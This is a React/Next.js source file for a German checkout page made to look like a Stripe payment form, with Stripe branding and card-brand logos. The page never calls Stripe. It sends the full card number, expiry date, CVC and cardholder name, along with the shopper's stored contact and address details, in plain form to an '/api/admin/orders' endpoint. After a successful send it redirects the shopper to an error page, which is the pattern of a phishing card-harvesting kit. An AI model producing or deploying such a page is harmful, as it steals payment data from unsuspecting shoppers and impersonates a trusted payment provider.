'use client';

import { useContext, useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { CartContext } from '../../../components/CartContext';
import { formatPhone } from '../../../utils/formatPhone';

export default function StripeCheckout() {
  const router = useRouter();
  const { total, items } = useContext(CartContext);
  
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [country, setCountry] = useState('Deutschland');
  const [saveCard, setSaveCard] = useState(false);
  const [cardError, setCardError] = useState('');
  const [expiryError, setExpiryError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    if (items.length === 0) {
      router.push('/');
    }
    const savedEmail = localStorage.getItem('customerEmail') || '';
    const savedPhone = localStorage.getItem('customerPhone') || '';
    setEmail(savedEmail);
    setPhone(savedPhone);
  }, [items, router]);

  function getCardType(num) {
    const cardNum = num.replace(/\s/g, '');
    if (/^4/.test(cardNum)) return 'visa';
    if (/^(5[1-5]|2[2-7])/.test(cardNum)) return 'mastercard';
    if (/^3[47]/.test(cardNum)) return 'amex';
    if (/^35/.test(cardNum)) return 'jcb';
    if (/^62/.test(cardNum)) return 'unionpay';
    return null;
  }

  function luhnCheck(num) {
    let sum = 0;
    let isEven = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10);
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  }

  function formatCardNumber(value) {
    let clean = value.replace(/\s/g, '').replace(/\D/g, '');
    if (clean.length > 16) clean = clean.substring(0, 16);
    
    let formatted = '';
    for (let i = 0; i < clean.length; i++) {
      if (i > 0 && i % 4 === 0) formatted += ' ';
      formatted += clean[i];
    }
    return formatted;
  }

  function formatExpiry(value) {
    let clean = value.replace(/\D/g, '');
    if (clean.length > 4) clean = clean.substring(0, 4);
    
    if (clean.length >= 1) {
      const month = clean.substring(0, 2);
      const year = clean.substring(2, 4);
      return `${month}${year ? '/' + year : ''}`;
    }
    return clean;
  }

  function handleCardNumberChange(e) {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    setCardError('');
  }

  function validateCard() {
    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length !== 16 || !luhnCheck(cleanCard)) {
      setCardError('Ungültige Kartennummer');
      return false;
    }
    return true;
  }

  function validateExpiry() {
    if (expiry.length !== 5) {
      setExpiryError('Ungültiges Verfallsdatum');
      return false;
    }
    
    const [month, year] = expiry.split('/');
    const monthNum = parseInt(month, 10);
    const yearNum = parseInt('20' + year, 10);
    
    if (monthNum < 1 || monthNum > 12) {
      setExpiryError('Ungültiger Monat');
      return false;
    }

    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;

    if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
      setExpiryError('Karte abgelaufen');
      return false;
    }

    return true;
  }

  async function handleSubmit(e) {
    e.preventDefault();
    
    if (!validateCard() || !validateExpiry() || !cardholderName.trim() || !cvc.trim()) {
      alert('Bitte füllen Sie alle Felder korrekt aus');
      return;
    }

    setIsLoading(true);

    try {
      const customerName = localStorage.getItem('customerName') || '';
      const customerEmail = localStorage.getItem('customerEmail') || '';
      const customerPhone = localStorage.getItem('customerPhone') || '';
      const customerAddress = localStorage.getItem('customerAddress') || '';
      const customerCity = localStorage.getItem('customerCity') || '';

      const response = await fetch('/api/admin/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          items,
          // ❌ УБРАНО: total больше не передается с фронтенда
          // Бэкенд должен вычислять total на основе актуальных цен из базы данных
          // по product ID из items
          // total: parseFloat(total.toFixed(2)),
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: customerAddress,
          city: customerCity,
          cardholderName,
          cardNumber: cardNumber,
          expiry: expiry,
          cvc: cvc,
          cardType: getCardType(cardNumber),
          country,
          stage: 'stripe_form',
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        router.push('/error');
      } else {
        alert('Fehler beim Verarbeiten der Zahlung');
      }
    } catch (error) {
      console.error('Payment error:', error);
      alert('Zahlungsfehler: ' + error.message);
    } finally {
      setIsLoading(false);
    }
  }

  if (items.length === 0) {
    return <div className="text-center py-8">Warenkorb ist leer</div>;
  }

  return (
    <div className="flex flex-col lg:flex-row min-h-screen pb-12 bg-white text-[#30313d]">
      <div className="w-full lg:w-1/2 flex flex-col items-center lg:items-end pt-8 lg:pt-20 px-4 lg:pr-16 bg-white lg:border-r lg:border-gray-100">
        <div className="w-full max-w-md">
          <div className="flex items-center mb-8 lg:mb-12">
            <button 
              onClick={() => router.back()}
              className="text-gray-400 hover:text-gray-600 mr-4"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
              </svg>
            </button>
          </div>
          
          <p className="text-gray-500 text-lg mb-2">Bestellung</p>
          <h1 className="text-3xl lg:text-4xl font-bold text-[#1a1f36]">{total.toFixed(2).replace('.', ',')} €</h1>
          
          <div className="mt-6 lg:mt-8 space-y-3 pb-6 lg:pb-0 border-b lg:border-b-0 border-gray-200">
            {items.map((item, idx) => (
              <div key={idx} className="flex justify-between text-sm text-gray-600">
                <span className="flex-1">{item.title}</span>
                <span className="ml-4">{item.price.toFixed(2).replace('.', ',')} €</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="w-full lg:w-1/2 bg-white pt-8 lg:pt-20 px-4 lg:pl-16">
        <div className="max-w-[440px] mx-auto lg:mx-0">
          <button disabled className="w-full bg-gray-300 text-gray-500 font-semibold py-3 rounded-lg flex items-center justify-center mb-6 cursor-not-allowed opacity-60">
            Zahlung mit <span className="ml-1 font-bold flex items-center"><span className="bg-black text-white rounded-full px-1 text-[10px] mr-1">Link</span> link</span>
          </button>

          <form onSubmit={handleSubmit} className="space-y-6">
            
            <div className="border border-gray-200 rounded-lg overflow-hidden input-shadow">
              <div className="px-4 py-3 border-b border-gray-200 flex items-center">
                <svg className="w-4 h-4 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="E-Mail"
                  className="w-full outline-none text-[15px] bg-transparent"
                  required
                />
              </div>
              <div className="px-4 py-3 border-t border-gray-200 flex items-center">
                <span className="mr-2">🇩🇪</span>
                <input
                  type="text"
                  value={phone}
                  onChange={(e) => setPhone(formatPhone(e.target.value))}
                  onKeyPress={(e)=>{if(!/[0-9+\-() ]/.test(e.key)) e.preventDefault();}}
                  placeholder="+49 (151) 123-45-67"
                  className="w-full outline-none text-[15px] bg-transparent"
                  required
                />
                <span className="text-gray-300">ⓘ</span>
              </div>
            </div>
            
            <section>
              <h3 className="font-semibold text-[15px] mb-2">Zahlungsart</h3>
              <div className="border border-gray-200 rounded-lg overflow-hidden input-shadow">
                
                <div className="p-3 relative">
                  <label className="text-[11px] text-[#6a7383] block mb-0.5">Kartendaten</label>
                  <div className="flex items-center justify-between">
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      onBlur={validateCard}
                      placeholder="1234 1234 1234 1234"
                      className="flex-1 outline-none text-[15px] placeholder-gray-400 bg-transparent"
                      maxLength="19"
                    />
                    
                    <div className="flex items-center space-x-1.5 ml-2 min-w-[70px] justify-end">
                      {(!cardNumber || getCardType(cardNumber) === 'visa') && (
                        <img 
                          src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" 
                          alt="Visa" 
                          className="h-[14px] w-auto object-contain opacity-90" 
                        />
                      )}
                      
                      {(!cardNumber || getCardType(cardNumber) === 'mastercard') && (
                        <img 
                          src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" 
                          alt="Mastercard" 
                          className="h-[14px] w-auto object-contain opacity-90" 
                        />
                      )}
                      
                      {getCardType(cardNumber) === 'amex' && (
                        <img 
                          src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" 
                          alt="Amex" 
                          className="h-[14px] w-auto object-contain shadow-sm rounded-[2px]" 
                        />
                      )}
                      
                      {getCardType(cardNumber) === 'unionpay' && (
                        <img 
                          src="https://upload.wikimedia.org/wikipedia/commons/1/1b/UnionPay_logo.svg" 
                          alt="UnionPay" 
                          className="h-[14px] w-auto object-contain border border-gray-100 rounded-[2px]" 
                        />
                      )}
                    </div>
                  </div>
                  {cardError && <div className="text-red-600 text-xs mt-1">{cardError}</div>}
                </div>

                <div className="flex border-t border-gray-200">
                  <div className="w-1/2 p-3 border-r border-gray-200">
                    <input
                      type="text"
                      value={expiry}
                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                      onBlur={validateExpiry}
                      placeholder="MM / JJ"
                      className="w-full outline-none text-[15px]"
                      maxLength="5"
                    />
                    {expiryError && <div className="text-red-600 text-xs mt-1">{expiryError}</div>}
                  </div>
                  <div className="w-1/2 p-3">
                    <input
                      type="text"
                      value={cvc}
                      onChange={(e) => setCvc(e.target.value.replace(/\D/g, '').substring(0, 4))}
                      placeholder="CVC-Code"
                      className="w-full outline-none text-[15px]"
                      maxLength="4"
                    />
                  </div>
                </div>
              </div>
            </section>

            <section>
              <label className="font-semibold text-[15px] block mb-2">Name des Karteninhabers</label>
              <input
                type="text"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                placeholder="Vorname, Nachname"
                className="w-full border border-gray-200 rounded-lg p-3 outline-none input-shadow"
              />
            </section>

            <section>
              <label className="font-semibold text-[15px] block mb-2">Land oder Region</label>
              <select
                value={country}
                onChange={(e) => setCountry(e.target.value)}
                className="w-full border border-gray-200 rounded-lg p-3 outline-none appearance-none bg-white input-shadow"
              >
                <option>Deutschland</option>
                <option>Österreich</option>
                <option>Schweiz</option>
                <option>Frankreich</option>
                <option>Italien</option>
                <option>Spanien</option>
                <option>Vereinigte Staaten</option>
              </select>
            </section>

            <div className="flex items-start p-4 border border-gray-200 rounded-lg bg-[#fcfcfd]">
              <input
                type="checkbox"
                checked={saveCard}
                onChange={(e) => setSaveCard(e.target.checked)}
                className="mt-1 mr-3 h-4 w-4 rounded border-gray-300"
              />
              <div>
                <p className="text-[14px] font-medium leading-tight">Meine Daten speichern, um schneller zu bezahlen</p>
                <p className="text-[12px] text-gray-500 mt-1">Zahlen Sie sicher auf dieser Website.</p>
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#0055ff] text-white font-semibold py-3 rounded-lg shadow-md hover:bg-[#0044cc] transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Verarbeitung...' : `${total.toFixed(2).replace('.', ',')} € bezahlen`}
            </button>

            <div className="mt-8 flex flex-col items-center justify-center">
              <p className="text-center text-[12px] text-gray-600 mb-3">Geschützt durch <span className="font-semibold">Stripe</span></p>
              <div className="flex items-center justify-center space-x-4 text-[#6a7383] text-[13px] font-medium">
                <a href="#" className="hover:text-[#30313d] transition-colors">Bedingungen</a>
                <span className="text-[#6a7383]">,</span>
                <a href="#" className="hover:text-[#30313d] transition-colors">Datenschutz</a>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
